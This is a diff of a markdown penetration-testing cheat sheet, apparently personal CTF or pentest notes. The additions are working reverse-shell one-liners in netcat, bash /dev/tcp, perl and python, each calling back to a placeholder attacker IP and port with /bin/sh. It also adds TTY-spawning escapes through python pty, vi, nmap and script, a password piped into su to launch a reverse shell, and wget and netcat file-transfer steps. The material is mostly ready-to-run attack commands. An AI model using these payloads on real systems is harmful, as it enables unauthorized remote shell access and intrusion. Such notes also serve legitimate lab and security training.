@@ -1,26 +1,119 @@
-# common go-to actions
+# common go-tos
 
+- [shells](#shells)
+  * [reverse shells](#reverse-shells)
+    + [netcat](#netcat)
+    + [bash](#bash)
+    + [perl](#perl)
+    + [python](#python)
+    + [php](#php)
+    + [msfvenom](#msfvenom)
+  * [spawning tty shells](#spawning-shells)
+    + [python](#python)
+    + [bash/sh](#bash/sh)
+    + [perl](#perl)
+    + [text editors](#within-text-editors)
+      - [vi](#vi)
+    + [nmap](#nmap)
+    + [script](#script)
+  * [making fully-interactive shells](#making-them-fully-interactive)
+    + [working around spawning issues](#spawn-workarounds)
+- [file transfers](#file-transfers)
+  * [wget](#wget)
+  * [netcat](#netcat)
+    + [files](#SENDING-FILES-BETWEEN-SYSTEMS)
+    + [directories](#SENDING-WHOLE-DIRECTORIES)
 
+---
 ## shells
+---
+### reverse shells
+---
 
+### netcat
+
+<small>sending:</small>
+```
+nc -e /bin/sh [LOCAL IP] [PORT]
+```
+
+<small>catching:</small>
+```
+nc -lvp [PORT]
+```
+
+### bash
+
+```
+bash -i >& /dev/tcp/[LOCAL IP]/[PORT] 0>&1
+```
+
+### perl
+
+```
+perl -e 'use Socket;$i="[LOCAL IP]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+### python
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LOCAL IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+### php
+
+### msfvenom
+
+
+
+----
 ### spawning shells
+----
 
-**python**
+#### **python**
 
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-**bash**
-
-**perl**
-
-#### making them full interactive
-
-**shortcut**:
+#### **bash/sh**
 ```
+/bin/sh -i
+```
+```
+echo os.system('/bin/bash')
+```
+
+#### **perl**
+```
+perl -e 'exec "/bin/sh";'
+```
+
+#### **witin text editors**:
+
+##### _vi_:
+```
+:!bash
+```
+```
+:set shell=/bin/bash:shell
+```
+
+#### **nmap**:
+```
+!sh
+```
+
+#### **script**
+
+```
+## this method can potentially avoid needing to do all the stty/fg/bg work below
 /usr/bin/script -qc /bin/bash /dev/null
 ```
+
+----
+### making them fully interactive
+----
 
 when getting a reverse shell through `netcat`, by default it's non-interactive - meaning it's a pain. once you run any of the above scripts to get a partially interactive shell, you can do a few more things to optimize:
 
@@ -78,7 +171,11 @@ then, from the remote/target machine:
 echo "[PASSWORD]" | su - [USER] -c "bas -i >& /dev/tcp/[LOCAL IP]/[PORT] 0>&1"
 ```
 
+---
 ## file transfers
+---
+
+### wget
 
 **METHOD ONE (`local server & wget`)**:
 
@@ -97,9 +194,11 @@ _'receiver' (more accurately, a fetcher here)_:
 wget http://[LOCAL IP]:8000/[FILE YOU WANT]
 ```
 
+### netcat
+
 **METHOD TWO (netcat)**:
 
-##### SENDING FILE(S) BETWEEN SYSTEMS
+##### SENDING FILES BETWEEN SYSTEMS
 
 _receiver_:
 
